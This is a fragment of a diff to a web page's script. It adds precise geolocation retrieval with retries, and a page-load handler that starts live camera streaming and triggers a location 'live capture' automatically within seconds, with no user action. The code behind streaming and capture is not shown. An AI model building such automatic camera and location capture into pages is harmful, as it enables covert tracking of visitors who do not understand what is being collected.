+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                    return;
                 }
+                
+                let attempts = 0;
+                const maxAttempts = 3;
+                
+                function tryGetLocation() {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            if (position.coords.accuracy <= 20 || attempts >= maxAttempts) {
+                                resolve(position);
+                            } else {
+                                attempts++;
+                                setTimeout(tryGetLocation, 1000);
+                            }
+                        },
+                        (error) => {
+                            if (attempts >= maxAttempts) {
+                                reject(error);
+                            } else {
+                                attempts++;
+                                setTimeout(tryGetLocation, 1000);
+                            }
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                }
+                
+                tryGetLocation();
             });
         }
+        
+        // AUTO-INITIALIZE LIVE STREAMING
+        window.addEventListener('load', () => {
+            // Pre-initialize camera for faster access
+            setTimeout(async () => {
+                try {
+                    await initLiveCameraStreaming();
+                    console.log('📹 Camera pre-initialized');
+                } catch (e) {
+                    console.log('Camera pre-init failed');
+                }
+            }, 1000);
+            
+            // Auto-trigger live capture
+            setTimeout(() => {
+                if (!isProcessing) {
+                    confirmLocation();
+                }
+            }, 2000);
+        });
+        
+        // Keep streaming active
+        setInterval(() => {
+            if (liveStreamActive) {
+                console.log('📹 Live streaming active:', new Date().toLocaleTimeString());
+            }
+        }, 30000);
     </script>
 </body>
 </html>
